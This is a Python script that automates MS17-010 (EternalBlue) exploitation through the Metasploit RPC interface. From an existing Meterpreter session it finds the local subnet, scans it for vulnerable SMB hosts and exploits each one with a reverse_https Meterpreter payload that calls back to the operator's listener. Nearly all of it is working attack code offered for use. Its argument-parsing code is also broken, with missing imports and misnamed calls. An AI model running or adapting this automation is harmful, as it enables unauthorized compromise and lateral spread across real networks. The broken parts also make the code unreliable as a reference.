# /usr/bin/env python3
# -*- coding: utf-8 -*-
# usage : python msf.py -p YouPassWord -lh YourIP -lp YourPort


from metasploit.msfrpc import MsfRpcClient
import re,optparse,sys
import socket
from time import sleep

def handler(console,lhost="192.168.141.128",lport="8443"):
    use_module = "use exploit/multi/handler"
    set_payload = "set payload windows/meterpreter/reverse_https"
    set_lhost = "set LHOST " + lhost
    set_lport = "set LPORT " + lport

    console.write(use_module)
    console.write(set_payload)
    console.write(set_lhost)
    console.write(set_lport)

    console.write("exploit")

def get_local_subnets(session):
    print("get local subnets")
    run_module = "run get_local_subnets"
    session.write(run_module)
    sleep(10)
    data = session.read()
    subnets = re.findall("(?:[0-9]{1,3}\.){3}[0-9]{1,3}/",data,re.M)
    subnets = subnets[0].strip('/')
    print("get local subnets is " + subnets + "/24")
    return subnets

def ms17_010_scan(console,rhosts):
    print("Starting scan ms17-010 ......")
    set_module = "use auxiliary/scanner/smb/smb_ms17_010"
    set_rhosts = "set RHOSTS " + rhosts + "/24"
    exploit = "exploit"
    console.write(set_module)
    console.write(set_rhosts)
    console.write(exploit)
    if(console.read()['busy'] == True):
        print(console.read())
        print("1")
        sleep(10)
    data = console.read()['data']
    print(data)
    vul_hosts = re.findall("(?:[0-9]{1,3}\.){3}[0-9]{1,3}",data,re.M)
    vul_hosts = list(set(vul_hosts))
    print(vul_hosts)
    return vul_hosts

def ms17_010_exp(console,rhost,lhost):
    rhost = str(rhost)
    print("Starting exploit ms17-010 in" + rhost)
    set_module = "use exploit/windows/smb/ms17_010_eternalblue"
    set_payload = "set payload windows/meterpreter/reverse_https"
    set_rhost = "set RHOST " + rhost
    set_lhost = "set LHOST " + lhost
    exploit = "exploit"
    console.write(set_module)
    console.write(set_payload)
    console.write(set_rhost)
    console.write(set_lhost)
    console.write(exploit)
    sleep(10)
    print(console.read())

def main():    
    args = argparse.ArgumentParser( description = '''Automatic exploit Ms17-010 in Local Area Network''',formatter_class = RawTextHelpFormatter)

    args.add_argument('-p','--passwd',type=str, help = 'Password of  your\'s msfrpcd Password')
    args.add_argument('-lh','--lhost',type=str, help= 'IP for the multi/handler LHOST')
    args.add_argument('-lp','--lport',type=str, default = '8443', help = 'port for the multi/handler LPORT')


    args.parser_args()

    (options, args) = parser.parse_args()
    passwd = options.passwd
    
    lhost = args.lhost
    lport = args.lport

    client = MsfRpcClient(passwd)
    console = client.consoles.console()
    print("create handler......")
    handler(console,lhost,lport)
    print("create handler done")
    print("use first sessions to scan")
    session = client.sessions.session(1)
    sessions = client.sessions.list
    subnets = get_local_subnets(session)
    vul_hosts = ms17_010_scan(console,subnets)
    for host in vul_hosts:
        #print(host)
        ms17_010_exp(console,host,lhost)

if __name__ == "__main__":
    
    main()
